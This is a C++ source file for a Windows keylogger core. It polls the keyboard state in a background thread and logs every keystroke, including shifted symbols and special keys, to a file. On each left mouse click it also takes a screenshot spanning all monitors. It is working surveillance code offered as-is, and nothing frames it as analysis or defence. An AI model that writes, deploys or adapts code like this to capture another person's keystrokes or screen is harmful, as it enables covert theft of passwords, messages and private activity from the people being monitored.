#include "KeyloggerCore.h"
#include <chrono>
#include <filesystem>
#include <vector>
#include <gdiplus.h>

KeyloggerCore::KeyloggerCore() : running(false), logging(false), screenshots(false), stopThread(false), topLeftX(-1), topLeftY(-1), botRightX(-1), botRightY(-1) {}

KeyloggerCore::~KeyloggerCore() { stop(); }

void KeyloggerCore::start() {
    if (running) return;
    stopThread = false;
    running = true;
    worker = std::thread(&KeyloggerCore::run, this);
}

void KeyloggerCore::stop() {
    stopThread = true;
    running = false;
    if (worker.joinable()) worker.join();
}

void KeyloggerCore::setLogging(bool enable) {
    if (enable && !logging) {
        // Clear key state buffer so no old keypresses are logged
        for (int c = 8; c <= 222; ++c) {
            GetAsyncKeyState(c);
        }
    }
    logging = enable;
}

void KeyloggerCore::setScreenshots(bool enable) { screenshots = enable; }
bool KeyloggerCore::isLogging() const { return logging; }
bool KeyloggerCore::isScreenshots() const { return screenshots; }

BOOL CALLBACK KeyloggerCore::MonitorEnumProc(HMONITOR hMonitor, HDC, LPRECT lprcMonitor, LPARAM dwData) {
    KeyloggerCore* self = reinterpret_cast<KeyloggerCore*>(dwData);
    MONITORINFO info; info.cbSize = sizeof(info);
    if (GetMonitorInfo(hMonitor, &info)) {
        if (self->topLeftX == -1 && self->topLeftY == -1) {
            self->topLeftX = info.rcMonitor.left;
            self->topLeftY = info.rcMonitor.top;
        }
        if (self->botRightX < info.rcMonitor.right) {
            self->botRightX = info.rcMonitor.right;
        }
        if (self->botRightY < info.rcMonitor.bottom) {
            self->botRightY = info.rcMonitor.bottom;
        }
    }
    return TRUE;
}

void KeyloggerCore::run() {
    FileOutput logger;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    unsigned char c;
    bool leftDown = false;
    while (!stopThread) {
        // --- Monitor enumeration ---
        std::vector<RECT> monitors;
        EnumDisplayMonitors(NULL, NULL, [](HMONITOR hMonitor, HDC, LPRECT lprcMonitor, LPARAM dwData) -> BOOL {
            auto* vec = reinterpret_cast<std::vector<RECT>*>(dwData);
            vec->push_back(*lprcMonitor);
            return TRUE;
        }, reinterpret_cast<LPARAM>(&monitors));

        // Screenshots independent of logging
        if (screenshots && (GetKeyState(VK_LBUTTON) & 0x80) != 0) {
            if (!leftDown) {
                if (monitors.size() == 4) {
                    // --- 2x2 grid for 4 monitors ---
                    int w = monitors[0].right - monitors[0].left;
                    int h = monitors[0].bottom - monitors[0].top;
                    int new_w = static_cast<int>(w / 1.25);
                    int new_h = static_cast<int>(h / 1.25);

                    int grid_w = new_w * 2;
                    int grid_h = new_h * 2;

                    Gdiplus::Bitmap gridBmp(grid_w, grid_h, PixelFormat32bppARGB);
                    Gdiplus::Graphics g(&gridBmp);

                    HDC hScreen = GetDC(HWND_DESKTOP);

                    for (int i = 0; i < 4; ++i) {
                        int x = monitors[i].left;
                        int y = monitors[i].top;
                        HDC hDc = CreateCompatibleDC(hScreen);
                        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, new_w, new_h);
                        HGDIOBJ old_obj = SelectObject(hDc, hBitmap);
                        SetStretchBltMode(hDc, HALFTONE);
                        StretchBlt(hDc, 0, 0, new_w, new_h, hScreen, x, y, w, h, SRCCOPY);

                        Gdiplus::Bitmap bmp(hBitmap, NULL);

                        int dest_x = (i % 2) * new_w;
                        int dest_y = (i / 2) * new_h;
                        g.DrawImage(&bmp, dest_x, dest_y, new_w, new_h);

                        SelectObject(hDc, old_obj);
                        DeleteDC(hDc);
                        DeleteObject(hBitmap);
                    }
                    ReleaseDC(HWND_DESKTOP, hScreen);

                    logger.screenshotBitmap(&gridBmp);
                } else {
                    // Fallback: original logic
                    int topLeftX = monitors.empty() ? 0 : monitors[0].left;
                    int topLeftY = monitors.empty() ? 0 : monitors[0].top;
                    int botRightX = monitors.empty() ? 0 : monitors[0].right;
                    int botRightY = monitors.empty() ? 0 : monitors[0].bottom;
                    for (const auto& r : monitors) {
                        if (r.left < topLeftX) topLeftX = r.left;
                        if (r.top < topLeftY) topLeftY = r.top;
                        if (r.right > botRightX) botRightX = r.right;
                        if (r.bottom > botRightY) botRightY = r.bottom;
                    }
                    POINT a{topLeftX, topLeftY};
                    POINT b{botRightX, botRightY};
                    logger.screenshot(a, b);
                }
                leftDown = true;
            }
        } else {
            leftDown = false;
        }
        // Logging independent of screenshots
        if (logging) {
            for (c = 8; c <= 222; c++) {
                if ((GetKeyState(VK_RBUTTON) & 0x80) != 0) continue;
                if (GetAsyncKeyState(c) & 0x0001) {
                    std::string s(1, c);
                    if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10))) {
                        std::string low(1, tolower(c));
                        logger.log(low);
                    } else if ((c > 64) && (c < 91)) {
                        logger.log(s);
                    } else {
                        switch (c) {
                        case VK_SPACE: logger.log("<SPACE>"); break;
                        case VK_RETURN: logger.log("<ENTER>"); break;
                        case VK_TAB: logger.log("<TAB>"); break;
                        case VK_ESCAPE: logger.log("<ESCAPE>"); break;
                        case VK_BACK: logger.log("<BACKSPACE>"); break;
                        case VK_DELETE: logger.log("<DELETE>"); break;
                        case VK_RSHIFT: logger.log("<RSHIFT>"); break;
                        case VK_SHIFT: logger.log("<SHIFT>"); break;
                        case VK_CAPITAL: logger.log("<CAPS_LOCK>"); break;
                        case VK_CONTROL: logger.log("<CONTROL>"); break;
                        case VK_MENU: logger.log("<ALT>"); break;
                        case VK_LWIN: logger.log("<WIN>"); break;
                        case VK_RWIN: logger.log("<WIN>"); break;
                        case VK_END: logger.log("<END>"); break;
                        case VK_HOME: logger.log("<HOME>"); break;
                        case VK_LEFT: logger.log("<LEFT>"); break;
                        case VK_UP: logger.log("<UP>"); break;
                        case VK_RIGHT: logger.log("<RIGHT>"); break;
                        case VK_DOWN: logger.log("<DOWN>"); break;
                        case VK_PRIOR: logger.log("<PAGE_UP>"); break;
                        case VK_NEXT: logger.log("<PAGE_DOWN>"); break;
                        case VK_INSERT: logger.log("<INSERT>"); break;
                        case VK_OEM_PLUS: GetAsyncKeyState(0x10) ? logger.log("+") : logger.log("="); break;
                        case VK_OEM_COMMA: GetAsyncKeyState(0x10) ? logger.log("<") : logger.log(","); break;
                        case VK_OEM_MINUS: GetAsyncKeyState(0x10) ? logger.log("_") : logger.log("-"); break;
                        case VK_OEM_PERIOD: GetAsyncKeyState(0x10) ? logger.log(">") : logger.log("."); break;
                        case VK_OEM_1: GetAsyncKeyState(0x10) ? logger.log(":") : logger.log(";"); break;
                        case VK_OEM_2: GetAsyncKeyState(0x10) ? logger.log("?") : logger.log("/"); break;
                        case VK_OEM_3: GetAsyncKeyState(0x10) ? logger.log("~") : logger.log("`"); break;
                        case VK_OEM_4: GetAsyncKeyState(0x10) ? logger.log("{") : logger.log("["); break;
                        case VK_OEM_5: GetAsyncKeyState(0x10) ? logger.log("|") : logger.log("\\"); break;
                        case VK_OEM_6: GetAsyncKeyState(0x10) ? logger.log("}") : logger.log("]"); break;
                        case VK_OEM_7: GetAsyncKeyState(0x10) ? logger.log("\"") : logger.log("'"); break;
                        case VK_F1: logger.log("<F1>"); break;
                        case VK_F2: logger.log("<F2>"); break;
                        case VK_F3: logger.log("<F3>"); break;
                        case VK_F4: logger.log("<F4>"); break;
                        case VK_F5: logger.log("<F5>"); break;
                        case VK_F6: logger.log("<F6>"); break;
                        case VK_F7: logger.log("<F7>"); break;
                        case VK_F8: logger.log("<F8>"); break;
                        case VK_F9: logger.log("<F9>"); break;
                        case VK_F10: logger.log("<F10>"); break;
                        case VK_F11: logger.log("<F11>"); break;
                        case VK_F12: logger.log("<F12>"); break;
                        case VK_NUMPAD0: logger.log("<NUM_0>"); break;
                        case VK_NUMPAD1: logger.log("<NUM_1>"); break;
                        case VK_NUMPAD2: logger.log("<NUM_2>"); break;
                        case VK_NUMPAD3: logger.log("<NUM_3>"); break;
                        case VK_NUMPAD4: logger.log("<NUM_4>"); break;
                        case VK_NUMPAD5: logger.log("<NUM_5>"); break;
                        case VK_NUMPAD6: logger.log("<NUM_6>"); break;
                        case VK_NUMPAD7: logger.log("<NUM_7>"); break;
                        case VK_NUMPAD8: logger.log("<NUM_8>"); break;
                        case VK_NUMPAD9: logger.log("<NUM_9>"); break;
                        case VK_ADD: logger.log("<NUM_ADD>"); break;
                        case VK_DECIMAL: logger.log("<NUM_DECIMAL>"); break;
                        case VK_DIVIDE: logger.log("<NUM_DIVIDE>"); break;
                        case VK_MULTIPLY: logger.log("<NUM_MULTIPLY>"); break;
                        case VK_SUBTRACT: logger.log("<NUM_SUBTRACT>"); break;
                        case VK_SEPARATOR: logger.log("<NUM_SEPARATOR>"); break;
                        case 48: GetAsyncKeyState(0x10) ? logger.log(")") : logger.log("0"); break;
                        case 49: GetAsyncKeyState(0x10) ? logger.log("!") : logger.log("1"); break;
                        case 50: GetAsyncKeyState(0x10) ? logger.log("@") : logger.log("2"); break;
                        case 51: GetAsyncKeyState(0x10) ? logger.log("#") : logger.log("3"); break;
                        case 52: GetAsyncKeyState(0x10) ? logger.log("$") : logger.log("4"); break;
                        case 53: GetAsyncKeyState(0x10) ? logger.log("%") : logger.log("5"); break;
                        case 54: GetAsyncKeyState(0x10) ? logger.log("^") : logger.log("6"); break;
                        case 55: GetAsyncKeyState(0x10) ? logger.log("&") : logger.log("7"); break;
                        case 56: GetAsyncKeyState(0x10) ? logger.log("*") : logger.log("8"); break;
                        case 57: GetAsyncKeyState(0x10) ? logger.log("(") : logger.log("9"); break;
                        }
                    }
                    Sleep(1);
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    Gdiplus::GdiplusShutdown(gdiplusToken);
}
